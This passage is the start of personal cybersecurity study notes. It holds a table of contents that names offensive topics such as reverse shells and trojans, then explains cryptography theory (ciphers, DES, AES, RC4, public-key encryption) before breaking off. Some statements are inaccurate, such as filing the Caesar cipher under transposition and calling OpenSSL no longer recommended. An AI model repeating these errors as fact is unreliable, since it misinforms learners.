# Table of Contents {#table-of-contents .TOC-Heading}

[Cryptology In Theory: Studying cryptography and cryptanalysis
[4](#cryptology-in-theory-studying-cryptography-and-cryptanalysis)](#cryptology-in-theory-studying-cryptography-and-cryptanalysis)

[General [4](#general)](#general)

[Tokenization [6](#tokenization)](#tokenization)

[Steganography [7](#steganography)](#steganography)

[Encryption [7](#encryption)](#encryption)

[Symmetric and asymmetric encryption
[7](#symmetric-and-asymmetric-encryption)](#symmetric-and-asymmetric-encryption)

[Symmetric Encryption [9](#symmetric-encryption)](#symmetric-encryption)

[Asymmetric Encryption (Public Key Encryption)
[14](#asymmetric-encryption-public-key-encryption)](#asymmetric-encryption-public-key-encryption)

[How AES and RSA work together (public and private)
[20](#how-aes-and-rsa-work-together-public-and-private)](#how-aes-and-rsa-work-together-public-and-private)

[Hashing [20](#hashing)](#hashing)

[MD5 [23](#md5)](#md5)

[SHA-1 [24](#sha-1)](#sha-1)

[SHA-2 [24](#sha-2)](#sha-2)

[MIC (message integrity check)
[25](#mic-message-integrity-check)](#mic-message-integrity-check)

[Cryptography Applications
[25](#cryptography-applications)](#cryptography-applications)

[Digital certificates and Public Key Infrastructure
[26](#digital-certificates-and-public-key-infrastructure)](#digital-certificates-and-public-key-infrastructure)

[SSL, and TLS: Cryptography in action
[30](#ssl-and-tls-cryptography-in-action)](#ssl-and-tls-cryptography-in-action)

[Cryptographic Hardware
[33](#cryptographic-hardware)](#cryptographic-hardware)

[Encrypted Web Traffic
[35](#encrypted-web-traffic)](#encrypted-web-traffic)

[Cryptology in Practice
[35](#cryptology-in-practice)](#cryptology-in-practice)

[Encoding [35](#encoding)](#encoding)

[base64 [35](#base64)](#base64)

[Hashing (Creating a hash digest of a string/file)
[36](#hashing-creating-a-hash-digest-of-a-stringfile)](#hashing-creating-a-hash-digest-of-a-stringfile)

[Introduction [36](#introduction)](#introduction)

[MD5 (128 bit hash) [36](#md5-128-bit-hash)](#md5-128-bit-hash)

[Verifying an invalid file
[38](#verifying-an-invalid-file)](#verifying-an-invalid-file)

[SHA [40](#sha)](#sha)

[SHA1 [40](#sha1)](#sha1)

[SHA256 [40](#sha256)](#sha256)

[\[Windows 10\] Hashing a files, dirs, and values
[41](#windows-10-hashing-a-files-dirs-and-values)](#windows-10-hashing-a-files-dirs-and-values)

[Encryption: Creating/inspecting keys, encrypting/decrypting and signing
[48](#encryption-creatinginspecting-keys-encryptingdecrypting-and-signing)](#encryption-creatinginspecting-keys-encryptingdecrypting-and-signing)

[RSA Encryption \[Asymmetric\]
[48](#rsa-encryption-asymmetric)](#rsa-encryption-asymmetric)

[AES Encryption \[Symmetric\]
[64](#aes-encryption-symmetric)](#aes-encryption-symmetric)

[Encrypting with PGP \[Asymmetric\]
[72](#encrypting-with-pgp-asymmetric)](#encrypting-with-pgp-asymmetric)

[Digital Signature: Signing with Hash with a private key
[78](#digital-signature-signing-with-hash-with-a-private-key)](#digital-signature-signing-with-hash-with-a-private-key)

[Creating signature and verifying it with openssl
[79](#creating-signature-and-verifying-it-with-openssl)](#creating-signature-and-verifying-it-with-openssl)

[Digital Certificate Management
[80](#digital-certificate-management)](#digital-certificate-management)

[Creating Certificates Using OpenSSL
[80](#creating-certificates-using-openssl)](#creating-certificates-using-openssl)

[Troubleshooting (s_client command)
[84](#troubleshooting-s_client-command)](#troubleshooting-s_client-command)

[Assigning SSL cert on apache
[84](#assigning-ssl-cert-on-apache)](#assigning-ssl-cert-on-apache)

[Red team: Understanding threats and attacks
[85](#red-team-understanding-threats-and-attacks)](#red-team-understanding-threats-and-attacks)

[Phases/Steps to Penetration Testing
[85](#phasessteps-to-penetration-testing)](#phasessteps-to-penetration-testing)

[PenTest stages [85](#pentest-stages)](#pentest-stages)

[Cyber Kill Chain [86](#cyber-kill-chain)](#cyber-kill-chain)

[Scope and Planning [87](#scope-and-planning)](#scope-and-planning)

[Determine Targets [87](#determine-targets)](#determine-targets)

[Legal Contracts and concepts
[87](#legal-contracts-and-concepts)](#legal-contracts-and-concepts)

[Technical Constraints (Limits)
[87](#technical-constraints-limits)](#technical-constraints-limits)

[Assessment types [87](#assessment-types)](#assessment-types)

[Phases -- Forensics [89](#phases-forensics)](#phases-forensics)

[Rules of Engagement (ROE)
[89](#rules-of-engagement-roe)](#rules-of-engagement-roe)

[Support Resources [93](#support-resources)](#support-resources)

[Privacy and remaining anonymmous
[95](#privacy-and-remaining-anonymmous)](#privacy-and-remaining-anonymmous)

[Tor [95](#tor)](#tor)

[ProxyChains [96](#proxychains)](#proxychains)

[Information Gathering
[103](#information-gathering)](#information-gathering)

[Passive (OSINT) [103](#passive-osint)](#passive-osint)

[Active [113](#active)](#active)

[Attacks in Practice [175](#attacks-in-practice)](#attacks-in-practice)

[Setting up a testing lab
[176](#setting-up-a-testing-lab)](#setting-up-a-testing-lab)

[Attack Frameworks [179](#attack-frameworks)](#attack-frameworks)

[Social Engineering Attacks
[179](#social-engineering-attacks)](#social-engineering-attacks)

[Software attacks: Malware (Malicious software)
[184](#software-attacks-malware-malicious-software)](#software-attacks-malware-malicious-software)

[Web/Browser-based attacks : Web security & Bug Bounty Hunting
[190](#webbrowser-based-attacks-web-security-bug-bounty-hunting)](#webbrowser-based-attacks-web-security-bug-bounty-hunting)

[Backdoors and Reverse shells
[244](#backdoors-and-reverse-shells)](#backdoors-and-reverse-shells)

[Trojans (Creating and deploying)
[271](#trojans-creating-and-deploying)](#trojans-creating-and-deploying)

[Password Attacks [277](#password-attacks)](#password-attacks)

[Network Attacks [289](#network-attacks)](#network-attacks)

[Email Spoofing [340](#email-spoofing-1)](#email-spoofing-1)

[Bluetooth Attacks [343](#bluetooth-attacks)](#bluetooth-attacks)

[Removing traces [344](#removing-traces)](#removing-traces)

[Purging files (shred)
[344](#purging-files-shred)](#purging-files-shred)

[Blue Team: Security in practice
[347](#blue-team-security-in-practice)](#blue-team-security-in-practice)

[**Roles in CyberSecurity**
[348](#roles-in-cybersecurity)](#roles-in-cybersecurity)

[Data Sources [349](#data-sources)](#data-sources)

[SOC Services [350](#soc-services)](#soc-services)

[**Threat Intelligence**
[351](#threat-intelligence)](#threat-intelligence)

[Understanding Threats
[352](#understanding-threats)](#understanding-threats)

[Key terms [353](#key-terms)](#key-terms)

[Six Steps of threat modeling
[353](#six-steps-of-threat-modeling)](#six-steps-of-threat-modeling)

[Threat Modeling Frameworks
[354](#threat-modeling-frameworks)](#threat-modeling-frameworks)

[Threat actor types [356](#threat-actor-types)](#threat-actor-types)

[Hacker types [358](#hacker-types)](#hacker-types)

[Threat Trees [359](#threat-trees)](#threat-trees)

[CIA (CIA Triad) [360](#cia-cia-triad)](#cia-cia-triad)

[Threat/Asset Matrix [366](#threatasset-matrix)](#threatasset-matrix)

[Finding Vulnerabilities
[371](#finding-vulnerabilities)](#finding-vulnerabilities)

[Vulnerability Types [371](#vulnerability-types)](#vulnerability-types)

[OSINT Tools (Open Source Intelligence)
[374](#osint-tools-open-source-intelligence)](#osint-tools-open-source-intelligence)

[McAfee Threat Report
[374](#mcafee-threat-report)](#mcafee-threat-report)

[CVE (Common Vulnerabilities and Exposures list) and NVD
[375](#cve-common-vulnerabilities-and-exposures-list-and-nvd)](#cve-common-vulnerabilities-and-exposures-list-and-nvd)

[The OWASP Top 10 Vulnerabilities
[377](#the-owasp-top-10-vulnerabilities)](#the-owasp-top-10-vulnerabilities)

[Compliance Standards
[379](#compliance-standards)](#compliance-standards)

[Security Controls [382](#security-controls)](#security-controls)

[The data lifecycle [389](#the-data-lifecycle)](#the-data-lifecycle)

[Analyzing and Scoring Vulnerabilities
[391](#analyzing-and-scoring-vulnerabilities)](#analyzing-and-scoring-vulnerabilities)

[Vulnerability Assessments
[391](#vulnerability-assessments)](#vulnerability-assessments)

[Security audits [392](#security-audits)](#security-audits)

[Vulnerability Management and Security Plans
[395](#vulnerability-management-and-security-plans)](#vulnerability-management-and-security-plans)

[NIST CSF (NIST Cyber Security framework)
[396](#nist-csf-nist-cyber-security-framework)](#nist-csf-nist-cyber-security-framework)

[NIST RMF (NIST Risk Management Framework)
[398](#nist-rmf-nist-risk-management-framework)](#nist-rmf-nist-risk-management-framework)

[System Hardening [399](#system-hardening)](#system-hardening)

[The eight CISSP security domains
[399](#the-eight-cissp-security-domains)](#the-eight-cissp-security-domains)

[Policies, Standards, and Procedures
[406](#policies-standards-and-procedures)](#policies-standards-and-procedures)

[Defense in Depth (five layers)
[407](#defense-in-depth-five-layers)](#defense-in-depth-five-layers)

[OWASP: Security Principles
[408](#owasp-security-principles)](#owasp-security-principles)

[Hardening by Asset [409](#hardening-by-asset)](#hardening-by-asset)

[Incident Response [590](#incident-response)](#incident-response)

[Incident Response Playbook (5 phases)
[590](#incident-response-playbook-5-phases)](#incident-response-playbook-5-phases)

[What is Digital Forensics?
[591](#what-is-digital-forensics)](#what-is-digital-forensics)

[Forensic tools/resources
[593](#forensic-toolsresources)](#forensic-toolsresources)

[Purple team [595](#purple-team)](#purple-team)

[White Team [596](#white-team)](#white-team)

[Review and quizzes [596](#review-and-quizzes)](#review-and-quizzes)

[Quiz (Attacks, Threats, and Vulnerabilities)
[597](#quiz-attacks-threats-and-vulnerabilities)](#quiz-attacks-threats-and-vulnerabilities)

[Quiz questions II [611](#quiz-questions-ii)](#quiz-questions-ii)

[Case sample: Creating a Company Culture for Security
[618](#case-sample-creating-a-company-culture-for-security)](#case-sample-creating-a-company-culture-for-security)

[Measuring and assessing risk
[618](#measuring-and-assessing-risk)](#measuring-and-assessing-risk)

[Security Goals [619](#security-goals)](#security-goals)

[**Final Project - Sample Submission**
[621](#final-project---sample-submission)](#final-project---sample-submission)

# Cryptology In Theory: Studying cryptography and cryptanalysis

## General

-   **Hashing**: \[*Integrity*\] Useful for generating a checksum to
    comparing if data has been changed/modified. SHA-256.

-   **Encrypting**: \[*Security/Confidentiality*\] Keeping a file secure
    with a password -- usually using AES-256 algorithm

-   **Generating Keys**: \[*Sending*\] Useful for sending file(s) in a
    secure manner. RSA.

The topic of **cryptography**, or hiding messages from potential
enemies, has been around for thousands of years. It\'s evolved
tremendously with the advent of modern technology, computers and
telecommunications.

**Encryption** is the act of taking a message, called plaintext, and
applying an operation to it, called a cipher. So that you receive a
garbled, unreadable message as the output, called ciphertext. We already
defined encryption, but the overarching discipline that covers the
practice of coding and hiding messages from third parties is called
cryptography. The study of this practice is referred to as cryptology.
The opposite of this looking for hidden messages or trying to decipher
coded message is referred to as cryptanalysis. These two fields have
co-evolved throughout history with new ciphers and cryptosystems being
developed as previous ones were broken or found to vulnerable.

The reverse process, taking the garbled output and transforming it back
into the readable plain text is called **decryption**. A cipher is
actually made up of two components, the **encryption algorithm** and the
**key**. The encryption algorithm is the underlying logic or process
that\'s used to convert the plaintext into ciphertext.

Just wait, given that the underlying purpose of cryptography is to
protect your secrets from being read by unauthorized parties, it would
make sense that at least some of the components of a cipher would need
to be kept secret too, right? You can keep the argument that by keeping
the algorithm secret, your messages are secured from a snooping third
party, and technically you wouldn\'t be wrong. This general concept is
referred to as, **security through obscurity**, which basically means,
[if no one knows what algorithm were using or general security practice,
then we\'re safe from attackers.]{.underline} Think of hiding your house
key under you doormat, as long as the burglar doesn\'t know that you
hide the spare key under the mat, you\'re safe. But once that
information is discovered, all security goes out the window along with
your valuables. So clearly, security through obscurity isn\'t something
that you should rely on for securing communication or systems, or for
your house for that matter. This overall concept of cryptography is
referred to as **Kerckhoff\'s principle**. This principle states that [a
cryptosystem, or a collection of algorithms for key generation and
encryption and decryption operations that comprise a cryptographic
service should remain secure, even if everything about the system is
known except for the key]{.underline}. What this means is that even if
your enemy knows the exact encryption algorithm you use to secure your
data, they\'re still unable to recover the plaintext from an intercepted
ciphertext. You may also hear this principle referred to as **Shannon\'s
maxim** or the **enemy knows the system**. The implications are the
same.

**Frequency analysis** is the practice of studying the frequency with
which letters appear in ciphertext. The premise behind this type of
analysis is that in written languages, certain letters appear more
frequently than others, and some letters are more commonly grouped
together than others. For example, the most commonly used letters in the
English language are e, t, a, and o. The most commonly seen pairs of
these letters are th, er, on, and an. Some ciphers, especially
**classical transposition** (character shifting) and **substitution
ciphers** (character mapping) preserve the relative frequency of letters
in the plaintext and so are potentially vulnerable to this type of
analysis.

**Steganography** is a related practice but distinctly different from
cryptography. It\'s the practice of hiding information from observers,
but not encoding it. Think of writing a message using invisible ink. The
message is in plaintext and no decoding is necessary to read the text
but the text is hidden from sight. The ink is invisible and must be made
visible using a mechanism known to the recipient.

**[Cryptography and Cryptanalysis]{.underline}**

-   **Cryptography**: Study of making codes.

-   **Cryptanalysis**: Study of breaking codes.

![A picture containing text Description automatically
generated](media/image1.png){width="3.455356517935258in"
height="3.6501443569553804in"}

![Chart Description automatically generated with medium
confidence](media/image2.png){width="6.5in"
height="2.6743055555555557in"}

## Tokenization

![Diagram Description automatically
generated](media/image3.png){width="6.5in" height="3.479861111111111in"}

## Steganography

The process of hiding a message within some other form of information.
This is not a form of encryption (as the payload isn't encrypted)
rather, this is a form of **obfuscation** where the payload is hidden
and knowledge of how and where to look will lead to the plaintext
payload.

## Encryption

### Symmetric and asymmetric encryption

Previously, you learned these terms: 

-   **Encryption**: the process of converting data from a readable
    format to an encoded format

-   **Public key infrastructure** (PKI):  an encryption framework that
    secures the exchange of online information

-   **Cipher**: an algorithm that encrypts information

All digital information deserves to be kept private, safe, and secure.
Encryption is one key to doing that! It is useful for transforming
information into a form that unintended recipients cannot understand. In
this reading, you'll compare symmetric and asymmetric encryption and
learn about some well-known algorithms for each.

#### Types of encryption

There are two main types of encryption:

-   **Symmetric encryption** is the use of a single secret key to
    exchange information. Because it uses one key for encryption and
    decryption, the sender and receiver must know the secret key to lock
    or unlock the cipher.

-   **Asymmetric encryption** is the use of a public and private key
    pair for encryption and decryption of data. It uses two separate
    keys: a public key and a private key. The public key is used to
    encrypt data, and the private key decrypts it. The private key is
    only given to users with authorized access.

#### The importance of key length

Ciphers are vulnerable to **brute force attacks**, which use a trial and
error process to discover private information. This tactic is the
digital equivalent of trying every number in a combination lock trying
to find the right one. In modern encryption, longer key lengths are
considered to be more secure. Longer key lengths mean more possibilities
that an attacker needs to try to unlock a cipher.

One drawback to having long encryption keys is slower processing times.
Although short key lengths are generally less secure, they're much
faster to compute. Providing fast data communication online while
keeping information safe is a delicate balancing act. 

#### Approved algorithms

Many web applications use a combination of symmetric and asymmetric
encryption. This is how they balance user experience with safeguarding
information. As an analyst, you should be aware of the most widely-used
algorithms.

##### Symmetric algorithms

-   *Triple DES (3DES)* is known as a block cipher because of the way it
    converts plaintext into ciphertext in "blocks." Its origins trace
    back to the Data Encryption Standard (DES), which was developed in
    the early 1970s. DES was one of the earliest symmetric encryption
    algorithms that generated 64-bit keys. A **bit** is the smallest
    unit of data measurement on a computer. As you might imagine, Triple
    DES generates keys that are 192 bits, or three times as long.
    Despite the longer keys, many organizations are moving away from
    using Triple DES due to limitations on the amount of data that can
    be encrypted. However, Triple DES is likely to remain in use for
    backwards compatibility purposes.   

-   *Advanced Encryption Standard (AES)* is one of the most secure
    symmetric algorithms today. AES generates keys that are 128, 192, or
    256 bits. Cryptographic keys of this size are considered to be safe
    from brute force attacks. It's estimated that brute forcing an AES
    128-bit key could take a modern computer billions of years!

##### Asymmetric algorithms

-   *Rivest Shamir Adleman (RSA)* is named after its three creators who
    developed it while at the Massachusetts Institute of Technology
    (MIT). RSA is one of the first asymmetric encryption algorithms that
    produces a public and private key pair. Asymmetric algorithms like
    RSA produce even longer key lengths. In part, this is due to the
    fact that these functions are creating two keys. RSA key sizes are
    1,024, 2,048, or 4,096 bits. RSA is mainly used to protect highly
    sensitive data.

-   *Digital Signature Algorithm (DSA)* is a standard asymmetric
    algorithm that was introduced by NIST in the early 1990s. DSA also
    generates key lengths of 2,048 bits. This algorithm is widely used
    today as a complement to RSA in public key infrastructure.

##### Generating keys

These algorithms must be implemented when an organization chooses one to
protect their data. One way this is done is using OpenSSL, which is an
open-source command line tool that can be used to generate public and
private keys. OpenSSL is commonly used by computers to verify digital
certificates that are exchanged as part of public key infrastructure.

**Note:** OpenSSL is just one option. There are various others available
that can generate keys with any of these common algorithms. 

Although many businesses use OpenSSL, it is no longer recommended since
the discovery of the  [Heartbleed
bug](https://en.wikipedia.org/wiki/Heartbleed) in 2014.

#### Obscurity is not security

In the world of cryptography, a cipher must be proven to be unbreakable
before claiming that it is secure. According to [Kerchoff's
principle](https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle),
cryptography should be designed in such a way that all the details of an
algorithm---except for the private key---should be knowable without
sacrificing its security. For example, you can access all the details
about how AES encryption works online and yet it is still unbreakable.

Occasionally, organizations implement their own, custom encryption
algorithms. There have been instances where those secret cryptographic
systems have been quickly cracked after being made public.

**Pro tip:** A cryptographic system *should not* be considered secure if
it requires secrecy around how it works.

##### Encryption is everywhere

Companies use both symmetric and asymmetric encryption. They often work
as a team, balancing security with user experience.

For example, websites tend to use asymmetric encryption to secure small
blocks of data that are important. Usernames and passwords are often
secured with asymmetric encryption while processing login requests. Once
a user gains access, the rest of their web session often switches to
using symmetric encryption for its speed.

Using data encryption like this is increasingly required by law.
Regulations like the Federal Information Processing Standards (FIPS
140-3) and the General Data Protection Regulation (GDPR) outline how
data should be collected, used, and handled. Achieving compliance with
either regulation is critical to demonstrating to business partners and
governments that customer data is handled responsibly.

### Symmetric Encryption

**Symmetric-key algorithm**, these types of encryption algorithms are
called *symmetric* because they use the same key to encrypt and decrypt
messages.

#### General/basic types

##### Substitution cyphers

Replacing one char with another.

##### Transposition cyphers

*Like Caesar cypher*

The number of the offset is the key. Another popular example of this is
referred to as R O T 13 or ROT-13, where the alphabet is rotated 13
places, but really ROT-13 is a Caesar cipher that uses a key of 13.

![Text Description automatically
generated](media/image4.png){width="6.5in" height="4.371527777777778in"}

You might notice something about the ROT-13 mapping table or the fact
that we\'re offsetting the alphabet by 13 characters. Thirteen is
exactly half of the alphabet. This results in the ROT-13 cipher being an
[inverse of itself]{.underline}. What this means is that [you can
recover the plaintext from ciphertext by performing the ROT-13 operation
on the ciphertext]{.underline}.

##### Block ciphers

The cipher takes data in, places that into a bucket or block of data
that\'s a fixed size, then encodes that entire block as one unit. If the
data to be encrypted isn\'t big enough to fill the block, the extra
space will be padded to ensure the plaintext fits into the blocks
evenly.

##### Stream ciphers. 

A **stream cipher** as the name implies, [takes a stream of input and
encrypts the stream one character or one digit at a time, outputting one
encrypted character or digit at a time.]{.underline} So, there\'s a one-
to-one relationship between data in and encrypted data out. Now
generally speaking, stream ciphers are faster (than block) and less
complex to implement, but they can be less secure than block ciphers. If
the key generation and handling isn\'t done properly, if the same key is
used to encrypt data two or more times, it\'s possible to break the
cipher and to recover the plaintext.

To avoid key reuse, **initialization vector** or **IV** is used (similar
to salt). That\'s a bit of random data that\'s integrated into the
encryption key and the resulting combined key is then used to encrypt
the data. The idea behind this is if you have one shared master key,
then generate a one-time encryption key. That master encryption key is
used only once by generating a new encryption key using the combination
of the master key and the IV. In order for the encrypted message to be
decoded, the IV must be sent in plaintext along with the encrypted
message. A good example of this can be seen when inspecting the 802.11
frame of a WEP encrypted wireless packet. The IV is included in
plaintext right before the encrypted data payload.

![Timeline Description automatically
generated](media/image5.png){width="6.5in"
height="3.5229166666666667in"}

#### Symmetric Encryption Algorithms

##### Data Encryption Standard (DES)

One of the earliest encryption standards is **DES**, which stands for
**Data Encryption Standard**. DES was designed in the 1970s by IBM, with
some input from the US National Security Agency. DES was adopted as an
official **FIPS**, **Federal Information Processing Standard** for the
US. This means that DES was adopted as a federal standard for encrypting
and securing government data. DES is a symmetric block cipher that uses
64-bit key sizes and operates on blocks 64-bits in size. Though the key
size is technically 64-bits in length, 8-bits are used only for parity
checking, a simple form of error checking. This means that real world
key length for DES is only 56-bits.

A quick note about encryption key sizes since we haven\'t covered that
yet. In symmetric encryption algorithms, the same key is used to encrypt
as to decrypt, everything else being the same.

The key is the unique piece that protects your data and the symmetric
key must be kept secret to ensure the confidentiality of the data being
protected. The key size, defined in bits, is the total number of bits or
data that comprises the encryption key. So you can think of the key size
as the upper limit for the total possible keys for a given encryption
algorithm. Key length is super important in cryptography since it
essentially defines the maximum potential strength of the system.
Imagine an ideal symmetric encryption algorithm where there are no flaws
or weaknesses in the algorithm itself. In this scenario, the only
possible way for an adversary to break your encryption would be to
attack the key instead of the algorithm. One attack method is to just
guess the key and see if the message decodes correctly. This is referred
to as a brute-force attack. Longer key lengths protect against this type
of attack. Let\'s take the DES key as an example. 64-bits long minus the
8 parity bits gives us a key length of 56-bits. This means that there
are a maximum of 2 to the 56th power, or 72 quadrillion possible keys.
That seems like a ton of keys, and back in the 1970s, it was. But as
technology advanced and computers got faster and more efficient, 64-bit
keys quickly proved to be too small. What were once only theoretical
attacks on a key size became reality in 1998 when the EFF, Electronic
Frontier Foundation, decrypted a DES-encrypted message in only 56 hours.

##### AES, Advanced Encryption Standard (AES)

Because of the inherent weakness of the small key size of DES,
replacement algorithms were designed and proposed. A number of new ones
appeared in the 1980s and 1990s. Many kept the 64-bit block size, but
used a larger key size, allowing for easier replacement of DES. In 1997,
the NIST, National Institute of Standards and Technology, wanted to
replace DES with a new algorithm, and in 2001, adopted **AES**,
**Advanced Encryption Standard**, after an international competition.

**AES** is also the first and only public cipher that\'s approved for
use with top secret information by the United States National Security
Agency. AES is also a symmetric block cipher similar to DES in which it
replaced. But AES uses 128-bit blocks, twice the size of DES blocks, and
supports key lengths of 128-bit, 192-bit, or 256-bit. Because of the
large key size, brute-force attacks on AES are only theoretical right
now, because the computing power required (or time required using modern
technology) exceeds anything feasible today. I want to call out that
these algorithms are the overall designs of the ciphers themselves.
These designs then must be implemented in either software or hardware
before the encryption functions can be applied and put to use. An
important thing to keep in mind when considering various encryption
algorithms is speed and ease of implementation. Ideally, an algorithm
shouldn\'t be overly difficult to implement because complicated
implementation can lead to errors and potential loss of security due to
bugs introduced in implementation. Speed is important because sometimes
data will be encrypted by running the data through the cipher multiple
times. These types of cryptographic operations wind up being performed
very often by devices, so the faster they can be accomplished with the
minimal impact to the system, the better. This is why some platforms
implement these cryptographic algorithms in hardware to accelerate the
processes and remove some of the burden from the CPU. For example,
modern CPUs from Intel or AMD have AES instructions built into the CPUs
themselves. This allows for far greater computational speed and
efficiency when working on cryptographic workloads. Let\'s talk briefly
about what was once a wildly used and popular algorithm but has since
been proven to be weak and is discouraged from use.

*Concise summary*

AES (Advanced Encryption Standard) has become the encryption algorithm
of choice for governments, financial institutions, and
security-conscious enterprises around the world. The U.S. National
Security Agency (NSC) uses it to protect the country's "top secret"
information.

The AES algorithm successively applies a series of mathematical
transformations to each 128-bit block of data. Because the computational
requirements of this approach are low, AES can be used with consumer
computing devices such as laptops and smartphones, as well as for
quickly encrypting large amounts of data. For example, the IBM z14
mainframe series uses AES to enable pervasive encryption in which all
the data in the entire system, whether at rest or in transit, is
encrypted.

AES is a symmetric algorithm which uses the same 128, 192, or 256 bit
key for both encryption and decryption (the security of an AES system
increases exponentially with key length). With even a 128-bit key, the
task of cracking AES by checking each of the 2128 possible key values (a
"brute force" attack) is so computationally intensive that even the
fastest supercomputer would require, on average, more than 100 trillion
years to do it. In fact, AES has never been cracked, and based on
current technological trends, is expected to remain secure for years to
come.

##### RC4

**RC4**, or **Rivest Cipher 4**, is a symmetric stream cipher that
gained widespread adoption because of its simplicity and speed. RC4
supports key sizes from 40-bits to 2,048-bits. So the weakness of RC4
aren\'t due to brute-force attacks, but the cipher itself has inherent
weaknesses and vulnerabilities that aren\'t only theoretically possible,
there are lots of examples showing RC4 being broken. A recent example of
RC4 being broken is the RC4 NOMORE attack. This attack was able to
recover an authentication cookie from a TLS-encrypted connection in just
52 hours. As this is an attack on the RC4 cipher itself, any protocol
that uses this cipher is potentially vulnerable to the attack. Even so,
RC4 was used in a bunch of popular encryption protocols, like WEP for
wireless encryption, and WPA, the successor to WEP. It was also
supported in SSL and TLS until 2015 when RC4 was dropped in all versions
of TLS because of inherent weaknesses. For this reason, most major web
browsers have dropped support for RC4 entirely, along with all versions
of SSL, and use TLS instead.

##### Galois/Counter Mode (GCM)

The preferred secure configuration is **TLS 1.2 with AES GCM**, a
specific mode of operation for the AES block cipher that essentially
turns it into a stream cipher.

**GCM**, or **Galois/Counter Mode**, works by taking randomized seed
value, incrementing this and encrypting the value, creating sequentially
numbered blocks of ciphertexts. The ciphertexts are then incorporated
into the plain text to be encrypted. GCM is super popular due to its
security being based on AES encryption, along with its performance, and
the fact that it can be run in parallel with great efficiency. You can
read more about the RC4 NOMORE attack in the next reading. So now that
we have covered symmetric encryption and some examples of symmetric
encryption algorithms, what are the benefits or disadvantages of using
symmetric encryption? Because of the symmetric nature of the encryption
and decryption process, it\'s relatively easy to implement and maintain.
That\'s one shared secret that you have to maintain and keep secure.
Think of your Wi-Fi password at home. There\'s one shared secret, your
Wi-Fi password, that allows all devices to connect to it. Can you
imagine having a specific Wi-Fi password for each device of yours? That
would be a nightmare and super hard to keep track of. Symmetric
algorithms are also very fast and efficient at encrypting and decrypting
large batches of data. So what are the downsides of using symmetric
encryption? While having one shared secret that both encrypts and
decrypts seems convenient up front, this can actually introduce some
complications. What happens if your secret is compromised? Imagine that
your Wi-Fi password was stolen and now you have to change it. Now you
have to update your Wi-Fi password on all your devices and any devices
your friends or family might bring over. What do you have to do when a
friend or family member comes to visit and they want to get on your
Wi-Fi? You need to provide them with your Wi-Fi password, or the shared
secret that protects your Wi-Fi network. This usually isn\'t an issue
since you hopefully know the person and you trust them, and it\'s
usually only one or two people at a time. But what if you had a party at
your place with 50 strangers? Side note, why are you having a party at
your home with 50 strangers? Anyhow, how could you provide the Wi-Fi
password only to the people you trust without strangers overhearing?
Things could get really awkward really fast. In the next lesson, we\'ll
explore other ways besides symmetric key algorithms to protect data and
information.

More info: <http://www.rc4nomore.com/>

SSL Stripping

![Diagram Description automatically
generated](media/image6.png){width="6.5in"
height="2.9756944444444446in"}

### Asymmetric Encryption (Public Key Encryption)

*Note: Asymmetric encryption is not inherently more secure than
symmetric encryption -- rather, it's more effective in unsecure
environments.*

#### General/Overview

##### Encryption in theory

**Public keys**: Can only encrypt -- but can't be used to decrypt.

**Private keys**: Can only be used to decrypt.

Note: A public key can be derived from a private key.

![A picture containing graphical user interface Description
automatically generated](media/image7.png){width="6.5in"
height="4.368055555555555in"}

Want to learn more about Asymmetric Encryption? Check out these extra
videos :\
\
\
<https://www.youtube.com/watch?v=NmM9HA2MQGI>\
\
<https://www.youtube.com/watch?v=Yjrfm_oRO0w>\
\
<https://www.youtube.com/watch?v=vsXMMT2CqqE&t=>\
\
<https://www.youtube.com/watch?v=NF1pwjL9-DE>

Remember why symmetric ciphers are referred to as symmetric? It\'s
because the same key is used to encrypt as to decrypt. This is in
contrast to asymmetric encryption systems because as the name implies,
**different keys are used to encrypt and decrypt**. So how exactly does
that work? Well, let\'s imagine here that there are two people who would
like to communicate securely, we\'ll call them Suzanne and Daryll. Since
they\'re using asymmetric encryption in this example, the first thing
they each must do is generate a private key, then using this private
key, a public key is derived. The strength of the asymmetric encryption
system comes from the computational difficulty of figuring out the
corresponding private key given a public key. Once Suzanne and Daryll
have generated private and public key pairs, they exchange public keys.
You might have guessed from the names that the public key is public and
can be shared with anyone, while the private key must be kept secret.
When Suzanne and Daryll have exchanged public keys, they\'re ready to
begin exchanging secure messages.

When Suzanne wants to send Daryll an encrypted message, she uses
Daryll\'s public key to encrypt the message and then send the
ciphertext. Daryll can then use his private key to decrypt the message
and read it, [because of the relationship between private and public
keys, only Daryll\'s private key can decrypt messages encrypted using
Daryll\'s public key]{.underline}. The same is true of Susanne\'s key
pairs. So when Daryll is ready to reply to Suzanne\'s message, he\'ll
use Suzanne\'s public key to encode his message and Suzanne will use her
private key to decrypt the message. Can you see why it\'s called
asymmetric or public key cryptography? We\'ve just described encryption
and decryption operations using an asymmetric cryptosystem, but there\'s
one other very useful function the system can perform, **public key
signatures**.

Let\'s go back to our friends Suzanne and Daryll. Let\'s say, Suzanne
wants to send a message to Darryll and she wants to make sure that
Daryll knows the message came from her and no one else, and that the
message was not modified or tampered with. She could do this by
composing the message and combining it with her private key to generate
a digital signature. She then sends this message along with the
associated digital signature to Daryll. We\'re assuming Suzanne and
Daryll have already exchanged public keys previously in this scenario.
Daryll can now verify the message\'s origin and authenticity by
combining the message, the digital signature, and Suzanne\'s public key.
If the message was actually signed using Susanne\'s private key and not
someone else\'s and the message wasn\'t modified at all, then the
digital signature should validate. If the message was modified, even by
one whitespace character, the validation will fail and Daryll shouldn\'t
trust the message. This is an important component of the asymmetric
cryptosystem. Without message verification, anyone could use Daryll\'s
public key and send him an encrypted message claiming to be from
Suzanne.

The three concepts that an asymmetric cryptosystem grants us are
**confidentiality**, **authenticity**, and **non-repudiation**.

-   **Confidentiality** is granted through the encryption-decryption
    mechanism. Since our encrypted data is kept confidential and secret
    from unauthorized third parties.

-   **Authenticity** is granted by the digital signature mechanism, as
    the message can be authenticated or verified that it wasn\'t
    tampered with.

-   **Non-repudiation** means that the author of the message isn\'t able
    to dispute the origin of the message. In other words, this allows us
    to ensure that the message came from the person claiming to be the
    author.

> Can you see the benefit of using an asymmetric encryption algorithm
> versus a symmetric one? Asymmetric encryption allows secure
> communication over an untrusted channel, but with symmetric
> encryption, we need some way to securely communicate the shared secret
> or key with the other party. If that\'s the case, it seems like
> asymmetric encryption is better, right? Well, sort of. While
> asymmetric encryption works really well in untrusted environments,
> it\'s also computationally more expensive and complex. On the other
> hand, symmetric encryption algorithms are faster, and more efficient,
> and encrypting large amounts of data. In fact, what many secure
> communications schemes do is take advantage of the relative benefits
> of both encryption types by using both, for different purposes. An
> asymmetric encryption algorithm is chosen as a key exchange mechanism
